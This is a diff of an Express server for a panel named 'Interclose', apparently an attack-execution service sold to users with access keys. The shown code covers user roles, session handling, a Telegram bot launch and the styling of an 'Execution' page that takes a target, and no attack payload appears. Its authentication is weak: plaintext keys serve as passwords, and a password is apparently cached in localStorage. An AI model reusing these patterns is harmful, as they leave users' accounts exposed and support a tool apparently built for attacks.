+      error: "User not found"
+    });
+  }
+  if (currentUser.role === "admin") {
+    if (targetUser.role !== "user") {
+      return res.json({
+        success: false,
+        error: "Forbidden"
+      });
+    }
+  }
+  const sanitizedUser = {
+    username: targetUser.username,
+    role: targetUser.role,
+    key: currentUser.role === "owner" ? targetUser.key : "********",
+    expired: targetUser.expired
+  };
+  const response = {
+    success: true,
+    user: sanitizedUser
+  };
+  res.json(response);
+});
+
+app.post("/api/user", requireAuth, (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  const { username, role, key, duration } = req.body;
+  const users = getUsers();
+  const currentUser = users.find(u => u.username === sessionUser);
+  if (!currentUser) {
+    return res.json({
+      success: false,
+      error: "User not found"
+    });
+  }
+  if (currentUser.role === "admin" && role !== "user") {
+    return res.json({
+      success: false,
+      error: "Admin can only create users"
+    });
+  }
+  if (!["owner", "admin", "user"].includes(role)) {
+    return res.json({
+      success: false,
+      error: "Invalid role"
+    });
+  }
+  if (users.find(u => u.username === username)) {
+    return res.json({
+      success: false,
+      error: "Username already exists"
+    });
+  }
+  let expired;
+  if (duration === "permanent") {
+    expired = Date.now() + 315360000000;
+  } else {
+    const durationMs = parseDuration(duration);
+    if (!durationMs) {
+      return res.json({
+        success: false,
+        error: "Invalid duration"
+      });
+    }
+    expired = Date.now() + durationMs;
+  }
+  let finalKey;
+  if (key && key.trim() !== "") {
+    finalKey = key.trim();
+    if (finalKey.length < 4) {
+      return res.json({
+        success: false,
+        error: "Key minimal 4 karakter"
+      });
+    }
+    if (users.find(u => u.key === finalKey)) {
+      return res.json({
+        success: false,
+        error: "Key sudah digunakan, coba key lain"
+      });
+    }
+  } else {
+    finalKey = generateRandomKey(6);
+  }
+  const newUser = {
+    username: username,
+    key: finalKey,
+    expired: expired,
+    role: role,
+    telegram_id: "",
+    isLoggedIn: false,
+    createdBy: sessionUser,
+    createdAt: Date.now()
+  };
+  users.push(newUser);
+  saveUsers(users);
+  const sanitizedUser = {
+    username: newUser.username,
+    role: newUser.role,
+    key: newUser.key,
+    expired: newUser.expired
+  };
+  const response = {
+    success: true,
+    message: "User created successfully",
+    user: sanitizedUser
+  };
+  res.json(response);
+});
+
+app.put("/api/user/:username", requireAuth, (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  const targetUsername = req.params.username;
+  const { role, key, duration } = req.body;
+  const users = getUsers();
+  const currentUser = users.find(u => u.username === sessionUser);
+  const targetIndex = users.findIndex(u => u.username === targetUsername);
+  if (!currentUser || targetIndex === -1) {
+    return res.json({
+      success: false,
+      error: "User not found"
+    });
+  }
+  const targetUser = users[targetIndex];
+  if (targetUser.role === "owner") {
+    return res.json({
+      success: false,
+      error: "Cannot edit user with owner role"
+    });
+  }
+  if (currentUser.role === "admin") {
+    if (targetUser.role !== "user") {
+      return res.json({
+        success: false,
+        error: "Forbidden"
+      });
+    }
+    if (role && role !== "user") {
+      return res.json({
+        success: false,
+        error: "Admin can only set role to 'user'"
+      });
+    }
+  }
+  if (role && ["owner", "admin", "user"].includes(role)) {
+    if (role === "owner") {
+      return res.json({
+        success: false,
+        error: "Cannot set role to owner via web interface"
+      });
+    }
+    users[targetIndex].role = role;
+  }
+  if (key && key.trim() !== "" && key.trim() !== targetUser.key) {
+    const newKey = key.trim();
+    if (newKey.length < 4) {
+      return res.json({
+        success: false,
+        error: "Key minimal 4 karakter"
+      });
+    }
+    if (users.find(u => u.key === newKey && u.username !== targetUsername)) {
+      return res.json({
+        success: false,
+        error: "Key sudah digunakan, coba key lain"
+      });
+    }
+    users[targetIndex].key = newKey;
+  }
+  if (duration) {
+    if (duration === "permanent") {
+      users[targetIndex].expired = Date.now() + 315360000000;
+    } else {
+      const durationMs = parseDuration(duration);
+      if (durationMs) {
+        users[targetIndex].expired = Date.now() + durationMs;
+      }
+    }
+  }
+  saveUsers(users);
+  res.json({
+    success: true,
+    message: "User updated successfully"
+  });
+});
+
+app.delete("/api/user/:username", requireAuth, (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  const targetUsername = req.params.username;
+  const users = getUsers();
+  const currentUser = users.find(u => u.username === sessionUser);
+  const targetUser = users.find(u => u.username === targetUsername);
+  if (!currentUser || !targetUser) {
+    return res.json({
+      success: false,
+      error: "User not found"
+    });
+  }
+  if (targetUser.role === "owner") {
+    return res.json({
+      success: false,
+      error: "Cannot delete user with owner role via web"
+    });
+  }
+  if (currentUser.role === "admin") {
+    if (targetUser.role !== "user") {
+      return res.json({
+        success: false,
+        error: "Forbidden"
+      });
+    }
+  }
+  const newUsers = users.filter(user => user.username !== targetUsername);
+  saveUsers(newUsers);
+  res.json({
+    success: true,
+    message: "User deleted successfully"
+  });
+});
+
+app.get("/api/session-check", (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  const sessionId = req.cookies.sessionId;
+  if (!sessionUser || !sessionId) {
+    return res.status(401).json({
+      error: "No session"
+    });
+  }
+  const sessionData = activeSessions.get(sessionUser);
+  if (!sessionData || sessionData.sessionId !== sessionId) {
+    return res.status(403).json({
+      error: "Invalid session"
+    });
+  }
+  const response = {
+    valid: true,
+    username: sessionUser
+  };
+  res.json(response);
+});
+
+app.get("/api/session-heartbeat", requireAuth, (req, res) => {
+  res.json({
+    success: true,
+    timestamp: Date.now()
+  });
+});
+
+app.get("/logout", (req, res) => {
+  const sessionUser = req.cookies.sessionUser;
+  if (sessionUser) {
+    activeSessions.delete(sessionUser);
+    savePersistentSessions();
+  }
+  const sessionId = req.cookies.sessionId;
+  if (sessionId) {
+    for (const [username, sessionData] of activeSessions.entries()) {
+      if (sessionData.sessionId === sessionId) {
+        activeSessions.delete(username);
+        console.log("[LOGOUT] Also removed " + username + " by sessionId match");
+        break;
+      }
+    }
+  }
+  const clearOptions = {
+    path: "/",
+    httpOnly: true,
+    expires: new Date(0)
+  };
+  res.clearCookie("sessionUser", clearOptions);
+  res.clearCookie("sessionId", clearOptions);
+  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, private, max-age=0");
+  res.setHeader("Pragma", "no-cache");
+  res.setHeader("Expires", "Thu, 01 Jan 1970 00:00:00 GMT");
+  res.setHeader("X-Accel-Expires", "0");
+  const logoutPage = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Logging out...</title>
+        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+        <meta http-equiv="Pragma" content="no-cache">
+        <meta http-equiv="Expires" content="0">
+        <script>
+            localStorage.removeItem('interclose_username');
+            localStorage.removeItem('interclose_password');
+            
+            document.cookie = "sessionUser=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT";
+            document.cookie = "sessionId=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT";
+            
+            window.history.replaceState(null, null, window.location.href);
+            
+            setTimeout(function() {
+                window.location.href = '/login?msg=' + encodeURIComponent('Logout berhasil') + '&t=' + Date.now();
+            }, 500);
+        </script>
+    </head>
+    <body style="background: #080310; color: white; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh;">
+        <div style="text-align: center;">
+            <div style="font-size: 24px; margin-bottom: 20px; color: #db2777;">🔐</div>
+            <div>Logging out...</div>
+            <div style="font-size: 12px; color: #9ca3af; margin-top: 10px;">Cleaning session data...</div>
+        </div>
+    </body>
+    </html>`;
+  res.send(logoutPage);
+});
+
+app.post("/api/logout-other-device", async (req, res) => {
+  try {
+    const { username, password } = req.body;
+    const users = getUsers();
+    const user = users.find(u => u.username === username && u.key === password);
+    if (!user) {
+      return res.json({
+        success: false,
+        error: "Invalid credentials"
+      });
+    }
+    activeSessions.delete(username);
+    savePersistentSessions();
+    res.json({
+      success: true,
+      message: "Other device logged out successfully"
+    });
+  } catch (error) {
+    console.error("Logout other device error:", error);
+    res.json({
+      success: false,
+      error: "Internal server error"
+    });
+  }
+});
+
+app.get("/profile", requireAuth, (req, res) => {
+  const profilePath = path.join(__dirname, "!─☇𝐒𝐢𝐗", "profil.html");
+  fs.readFile(profilePath, "utf8", (err, data) => {
+    if (err) {
+      return res.status(500).send("❌ File tidak ditemukan");
+    }
+    res.send(data);
+  });
+});
+
+app.get("/my-support", requireAuth, (req, res) => {
+  const supportPath = path.join(__dirname, "!─☇𝐒𝐢𝐗", "my-supports.html");
+  fs.readFile(supportPath, "utf8", (err, data) => {
+    if (err) {
+      return res.status(500).send("❌ File tidak ditemukan");
+    }
+    res.send(data);
+  });
+});
+
+const figlet = require("figlet");
+const gradient = require("gradient-string");
+const boxen = require("boxen");
+const ora = require("ora");
+
+function showBanner() {
+  console.clear();
+  figlet("Interclose", {
+    font: "Standard"
+  }, (err, data) => {
+    if (err) {
+      return;
+    }
+    console.log(gradient.pastel.multiline(data));
+    const author = "𝐆𝐮𝐧𝐳";
+    const owners = ["@GunzKapotited"];
+    const info = (`
+Author    : ${author}
+Version   : 2.0.0
+Owner ID  : ${owners.join(", ")}
+Status    : Active
+        `).trim();
+    console.log(boxen(info, {
+      padding: 1,
+      margin: 0,
+      borderStyle: "round",
+      borderColor: "cyan",
+      title: "System Information",
+      titleAlignment: "center"
+    }));
+    console.log("\n");
+    console.table({
+      Apps: "Intercolse",
+      Type: "Xapp",
+      Version: 2
+    });
+    console.log("\n");
+    const spinner = ora({
+      text: "Initializing Interclose modules...",
+      spinner: {
+        interval: 80,
+        frames: ["⏤    ", " ⏤⏤   ", "  ⏤⏤⏤ ", "   ⏤⏤⏤", "    ⏤⏤", "     ⏤"]
+      }
+    }).start();
+    setTimeout(() => {
+      spinner.text = "Connecting to database...";
+      spinner.color = "yellow";
+    }, 2000);
+    setTimeout(() => {
+      spinner.succeed(chalk.yellow("System ready. Interclose is now online!"));
+      spinner.succeed(chalk.blue("Klick your domain here. " + ipvps + ":" + port));
+      console.log(chalk.green("┌────────────────────────────────────┐\n│           Interclose            │\n└────────────────────────────────────┘"));
+      console.log(chalk.dim("Waiting for messages..."));
+      bot.launch();
+    }, 3000);
+  });
+}
+
+showBanner();
+
+setInterval(() => {
+  const backupFile = path.join(__dirname, "database", "sessions.json") + ".backup-" + new Date().toISOString().split("T")[0];
+  try {
+    const sessionsFile = path.join(__dirname, "database", "sessions.json");
+    if (fs.existsSync(sessionsFile)) {
+      fs.copyFileSync(sessionsFile, backupFile);
+    }
+  } catch (error) {
+    console.error("[BACKUP] Failed to backup sessions:", error);
+  }
+}, 86400000);
+
+setInterval(() => {
+  const activeCount = activeConnections.size;
+  const allSessions = loadUserSessions();
+  const totalRegistered = Object.values(allSessions).reduce((sum, arr) => sum + arr.length, 0);
+  console.log("📊 Health Check: " + activeCount + "/" + totalRegistered + " sessions active");
+  if (totalRegistered > 0 && activeCount === 0) {
+    reloadAttempts = 0;
+    startupReload();
+  } else if (activeCount > 0) {
+    console.log("✅ Health check: Sessions are active");
+  }
+}, 600000);
+
+setInterval(cleanupExpiredSessions, 3600000);
+setTimeout(cleanupExpiredSessions, 5000);
+
+app.listen(port, () => {
+  console.log(chalk.green("✓ Server sudah aktif"));
+});
+
+const generateExecutionPage = (status = "🟥 Ready", data = {}, showForm = true, user = {}, target = "", mode = "") => {
+  const { username, expired, role } = user;
+  const expiredDate = expired ? new Date(expired).toLocaleString("id-ID", {
+    timeZone: "Asia/Jakarta",
+    year: "2-digit",
+    month: "2-digit",
+    day: "2-digit",
+    hour: "2-digit",
+    minute: "2-digit"
+  }) : "-";
+  
+  return `<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Interclose - Execution</title>
+    
+    <!-- Load Font Share Tech Mono -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    
+    <!-- FontAwesome (Tetap disimpan untuk ikon lain) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        /* --- VARIABLES --- */
+        :root {
+            --bg-dark: #080310;       
+            --bg-gradient: radial-gradient(circle at 50% 0%, #1a0b2e 0%, #080310 80%);
+            
+            --accent-pink: #db2777;   
+            --accent-purple: #9333ea; 
+            --accent-green: #10b981;
+            
+            --text-gray: #9ca3af; 
+            --font-main: 'Share Tech Mono', monospace;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
+        
+        body {
+            background-color: var(--bg-dark);
+            background-image: var(--bg-gradient);
+            color: #ffffff;
+            font-family: var(--font-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+            letter-spacing: 0.5px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+            padding-bottom: 110px; 
+            position: relative;
+        }
+
+        /* --- HEADER --- */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 24px; 
+            background: rgba(8, 3, 16, 0.95);
+            z-index: 50;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .header-left { display: flex; align-items: center; gap: 15px; }
+
+        /* SVG Menu Button Style */
+        .menu-btn {
+            cursor: pointer;
+            color: white;
+            transition: transform 0.2s;
+        }
+        .menu-btn:active {
+            transform: scale(0.9);
+            color: var(--accent-pink);
+        }
+
+        .brand-title {
+            font-size: 20px; 
+            font-weight: 400;
+            letter-spacing: 1.5px;
+            color: #fff;
+            text-shadow: 0 0 10px rgba(219, 39, 119, 0.6);
+        }
+
+        /* --- MAIN CONTENT --- */
+        main {
+            padding: 20px 24px; 
+            display: flex;
+            flex-direction: column;
+            gap: 20px; 
+        }
+
+        /* === USER CARD === */
+        .user-card {
+            width: 100%;
+            height: 95px; 
+            border-radius: 16px;
+            border: 1px solid rgba(219, 39, 119, 0.2);
+            box-shadow: 0 4px 15px rgba(219, 39, 119, 0.1);
+            background: linear-gradient(135deg, rgba(219, 39, 119, 0.15) 0%, rgba(147, 51, 234, 0.15) 100%);
+            display: flex;
+            align-items: center; 
+            padding: 0 16px; 
+        }
+
+        .user-card-content {
+            width: 100%;
+            display: flex;
+            align-items: center; 
+            gap: 14px;
+        }
+
+        .profile-photo {
+            width: 60px; 
+            height: 60px;
+            border-radius: 50%;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            overflow: hidden;
+            flex-shrink: 0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+        }
+
+        .profile-photo img {
+            width: 115%; 
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .user-info-middle {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center; 
+            gap: 4px;
+            overflow: hidden;
+        }
+
+        .username {
+            font-size: 16px; 
+            color: white;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            line-height: 1.2;
+        }
+
+        .role-box {
+            display: inline-flex;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 4px;
+            padding: 3px 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            width: fit-content;
+        }
+
+        .role-label { font-size: 8px; color: var(--text-gray); margin-right: 5px; text-transform: uppercase; }
+        .role-value { font-size: 10px; color: var(--accent-pink); text-transform: uppercase; font-weight: bold; }
+
+        .expiry-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 6px 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            min-width: 75px;
+        }
+
+        .expiry-label { font-size: 8px; color: var(--text-gray); margin-bottom: 2px; text-transform: uppercase; }
+        .expiry-date { font-size: 11px; color: white; }
+
+
+        /* === BANNER === */
+        .banner {
+            width: 100%;
+            height: 140px; 
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 3px 10px rgba(0,0,0,0.25);
+        }
+        
+        .banner img { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover; 
+            opacity: 1;
+        }
+        
+        .banner-text {
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%;
+            display: flex; 
+            align-items: flex-end;
+            justify-content: flex-start;
+            padding: 13px;
+            background: linear-gradient(to top, rgba(0,0,0,0.7) 0%, transparent 100%);
+        }
+        
+        .banner-text h2 {
+            font-size: 15px; 
+            letter-spacing: 1px;
+            color: white;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.9); 
+            margin: 0;
+        }
+
+        /* FORM INPUTS */
+        .form-section { display: flex; flex-direction: column; gap: 18px; }
+
+        .input-group { margin-bottom: 0; }
+
+        .input-header {
+            background: linear-gradient(90deg, rgba(219, 39, 119, 0.7), rgba(147, 51, 234, 0.7));
+            padding: 10px 15px; 
+            border-radius: 10px 10px 0 0;
+            border: 1px solid rgba(219, 39, 119, 0.25);
+            border-bottom: none;
+        }
+        .input-header h3 { font-size: 15px; letter-spacing: 1px; color: white; } 
+
+        .input-body {
+            background-color: rgba(26, 11, 46, 0.7);
+            border: 1px solid rgba(219, 39, 119, 0.15);
+            border-top: none;
+            border-radius: 0 0 10px 10px;
+            padding: 15px; 
+            display: flex; align-items: center; gap: 12px;
+        }
+        .input-body i { color: var(--accent-pink); font-size: 18px; } 
+
+        .custom-input {
+            background: transparent; border: none; outline: none;
+            color: #d1d5db; font-family: var(--font-main);
+            font-size: 14px; 
+            width: 100%;
+        }
+        .custom-input::placeholder { color: #6b7280; font-size: 14px; }
+        
+        /* --- IMPROVED CUSTOM DROPDOWN --- */
+        .custom-dropdown {
+            position: relative;
+            width: 100%;
+        }
+        
+        .dropdown-selected {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 6px;
+            outline: none;
+            color: #d1d5db;
+            font-family: var(--font-main);
+            font-size: 14px;
+            width: 100%;
+            cursor: pointer;
+            text-align: left;
+            padding: 10px;
+            height: auto;
+            transition: all 0.3s;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .dropdown-selected:hover {
+            border-color: rgba(219, 39, 119, 0.4);
+            background: rgba(219, 39, 119, 0.05);
+        }
+        
+        .dropdown-selected.empty {
+            color: #6b7280;
+        }
+        
+        .dropdown-options {
+            position: absolute;
+            top: calc(100% + 8px);
+            left: 0;
+            width: 100%;
+            background: rgba(15, 5, 24, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(219, 39, 119, 0.3);
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            z-index: 1000;
+            max-height: 250px;
+            overflow-y: auto;
+            
+            /* Animation props */
+            opacity: 0;
+            visibility: hidden;
+            transform: translateY(-10px);
+            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        
+        .dropdown-options.active {
+            opacity: 1;
+            visibility: visible;
+            transform: translateY(0);
+        }
+        
+        .dropdown-option {
+            padding: 14px 15px;
+            cursor: pointer;
+            color: #d1d5db;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            transition: all 0.2s;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .dropdown-option:last-child {
+            border-bottom: none;
+        }
+        
+        .dropdown-option:hover {
+            background-color: rgba(219, 39, 119, 0.1);
+            color: white;
+            padding-left: 20px; 
+            border-left: 3px solid var(--accent-pink);
+        }
+        
+        .dropdown-option.selected {
+            background-color: rgba(219, 39, 119, 0.15);
+            color: var(--accent-pink);
+            border-left: 3px solid var(--accent-pink);
+        }
+
+        .option-icon {
+            width: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: var(--text-gray);
+        }
+
+        .dropdown-icon {
+            color: var(--accent-pink);
+            pointer-events: none;
+            transition: transform 0.3s;
+        }
+        
+        .dropdown-icon.active {
+            transform: rotate(180deg);
+        }
+
+        /* BUTTON */
+        .send-btn {
+            width: 100%;
+            background: linear-gradient(100deg, var(--accent-pink), var(--accent-purple));
+            color: white; border: none;
+            padding: 15px; 
+            font-weight: 600;
+            border-radius: 15px;
+            font-family: var(--font-main);
+            font-size: 14px; 
+            letter-spacing: 0px;
+            cursor: pointer;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            box-shadow: 0 4px 15px rgba(219, 39, 119, 0.3);
+            margin-top: 10px;
+            transition: transform 0.1s;
+        }
+        .send-btn:active { transform: scale(0.98); }
+        .send-btn:disabled {
+            background: #374151;
+            box-shadow: none;
+            color: #9ca3af;
+            cursor: not-allowed;
+        }
+
+        /* --- BOTTOM NAV (UPDATED - HANYA 3 MENU) --- */
+        .bottom-nav {
+            position: fixed; bottom: 0; left: 0; width: 100%;
+            background-color: rgba(8, 3, 16, 0.98);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            height: 75px; 
+            display: flex; justify-content: space-around; align-items: center;
+            z-index: 100;
+        }
+
+        .nav-item {
+            display: flex; flex-direction: column; align-items: center; gap: 5px;
+            cursor: pointer; color: var(--text-gray);
+            background: none; border: none; width: 80px;
+            transition: all 0.2s;
+        }
+
+        .nav-item:active { transform: scale(0.95); }
+        .nav-item.active { color: var(--accent-pink); }
+        
+        .nav-text {
+            font-size: 10px; 
+            font-family: var(--font-main);
+            font-weight: 400;
+        }
+
+        /* --- SIDEBAR CSS SAMA SEPERTI DASHBOARD --- */
+        .sidebar-overlay {
+            position: fixed; inset: 0;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(4px);
+            z-index: 998;
+            opacity: 0; visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        .sidebar-overlay.active { opacity: 1; visibility: visible; }
+
+        .sidebar {
+            position: fixed; top: 0; left: 0; height: 100%;
+            width: 280px;
+            background: rgba(15, 5, 24, 0.98);
+            border-right: 1px solid rgba(219, 39, 119, 0.3);
+            box-shadow: 10px 0 30px rgba(0,0,0,0.6);
+            z-index: 999;
+            transform: translateX(-100%);
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex; flex-direction: column;
+        }
+        .sidebar.active { transform: translateX(0); }
+
+        .sidebar-header {
+            height: 180px;
+            width: 100%;
+            background-image: url('https://files.catbox.moe/fgye5n.jpg'); 
+            background-size: cover;
+            background-position: center;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            padding: 20px;
+        }
+
+        .sidebar-header::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(to top, rgba(15, 5, 24, 1) 15%, rgba(15, 5, 24, 0.4) 60%, transparent 100%);
+            z-index: 1;
+        }
+
+        .sidebar-user {
+            position: relative;
+            z-index: 2;
+            text-align: left;
+        }
+
+        .sidebar-user h3 { 
+            font-size: 20px; 
+            font-weight: 400; 
+            letter-spacing: 0.5px; 
+            color: #fff; 
+            margin-bottom: 4px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+        }
+
+        .user-tag { 
+            font-size: 11px; 
+            color: var(--accent-pink); 
+            letter-spacing: 0px; 
+            font-weight: 400;
+            background: rgba(0,0,0,0.6);
+            padding: 3px 8px;
+            border-radius: 4px;
+            border: 1px solid rgba(219, 39, 119, 0.3);
+            display: inline-block;
+        }
+
+        .sidebar-menu { 
+            list-style: none; 
+            padding: 15px; 
+            flex: 1; 
+            overflow-y: auto; 
+        }
+        .sidebar-item { margin-bottom: 6px; }
+        .sidebar-link {
+            display: flex; align-items: center; gap: 15px;
+            padding: 12px 15px;
+            color: #d1d5db;
+            text-decoration: none;
+            font-size: 14px; font-weight: 400; letter-spacing: 0px;
+            border-radius: 10px;
+            transition: all 0.2s;
+        }
+        .sidebar-link svg { width: 20px; height: 20px; opacity: 0.7; }
+        
+        .sidebar-link:active, .sidebar-link:hover {
+            background: rgba(236, 72, 153, 0.1);
+            color: var(--accent-pink);
+        }
+        .sidebar-link:active svg, .sidebar-link:hover svg { opacity: 1; color: var(--accent-pink); }
+
+        .menu-separator {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent);
+            margin: 15px 0;
+            width: 100%;
+        }
+
+        .sidebar-credits {
+            padding: 0 10px;
+            margin-bottom: 10px;
+        }
+
+        .credits-title {
+            font-size: 11px;
+            color: var(--accent-pink);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+            font-weight: 400;
+            opacity: 0.9;
+            padding-left: 10px;
+        }
+
+        .credit-item {
+            font-size: 12px;
+            color: #6b7280;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            letter-spacing: 0px;
+            padding-left: 10px;
+        }
+
+        .credit-item span {
+            color: #e5e7eb;
+            font-weight: 400;
+        }
+
+        .sidebar-footer { padding: 20px; border-top: 1px solid rgba(255,255,255,0.05); }
+        .logout-btn {
+            width: 100%; padding: 12px;
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #ef4444;
+            border-radius: 12px;
+            font-family: var(--font-main);
+            font-size: 13px; font-weight: 700; letter-spacing: 1px;
+            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
+            transition: background 0.2s;
+        }
+        .logout-btn:active { background: rgba(239, 68, 68, 0.2); }
+
+        /* --- SUCCESS MODAL CSS --- */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(5px);
+            z-index: 2000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .success-card {
+            background: #11071F;
+            border: 1px solid var(--accent-pink);
+            width: 85%;
+            max-width: 320px;
+            padding: 30px 20px;
+            border-radius: 20px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 0 30px rgba(219, 39, 119, 0.2);
+            transform: scale(0.8);
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .modal-overlay.active .success-card {
+            transform: scale(1);
+        }
+
+        .success-icon-container {
+            width: 70px; height: 70px;
+            background: rgba(16, 185, 129, 0.1);
+            border: 2px solid var(--accent-green);
+            border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 0 15px rgba(16, 185, 129, 0.3);
+        }
+
+        .success-icon-container i {
+            color: var(--accent-green);
+            font-size: 32px;
+            animation: checkPop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+        }
+
+        @keyframes checkPop {
+            0% { transform: scale(0); opacity: 0; }
+            80% { transform: scale(1.2); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .success-title {
+            color: white; font-size: 18px; margin-bottom: 5px;
+            letter-spacing: 1px;
+        }
+
+        .success-subtitle {
+            color: var(--text-gray); font-size: 12px; margin-bottom: 20px;
+        }
+
+        .success-details {
+            background: rgba(0,0,0,0.3);
+            border-radius: 8px;
+            padding: 10px;
+            margin-bottom: 20px;
+            text-align: left;
+            border: 1px dashed rgba(255,255,255,0.1);
+        }
+
+        .detail-row {
+            display: flex; justify-content: space-between;
+            font-size: 11px; margin-bottom: 5px;
+        }
+        .detail-row:last-child { margin-bottom: 0; }
+        .detail-label { color: #6b7280; }
+        .detail-value { color: var(--accent-pink); font-weight: bold; }
+
+        .close-modal-btn {
+            background: var(--accent-pink);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 10px;
+            font-family: var(--font-main);
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(219, 39, 119, 0.3);
+        }
+
+        /* Loading Spinner */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: var(--accent-pink);
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Hide class */
+        .hidden {
+            display: none !important;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="sidebar-overlay" id="sidebarOverlay"></div>
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <div class="sidebar-user">
+                <h3 id="sidebar-username">${username || "Loading..."}</h3>
+                <div class="user-tag" id="sidebar-role">Role: ${role ? role.toUpperCase() : "USER"}</div>
+            </div>
+        </div>
+
+        <ul class="sidebar-menu">
+            <li class="sidebar-item">
+                <a href="/dashboard" class="sidebar-link">
+                    <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg>
+                    Dashboard
+                </a>
+            </li>
+            <li class="sidebar-item">
+                <a href="/profile" class="sidebar-link">
+                    <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
+                    Profile
+                </a>
+            </li>
+            <li class="sidebar-item">
+                <a href="/execution" class="sidebar-link active">
+                    <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                    Execution
+                </a>
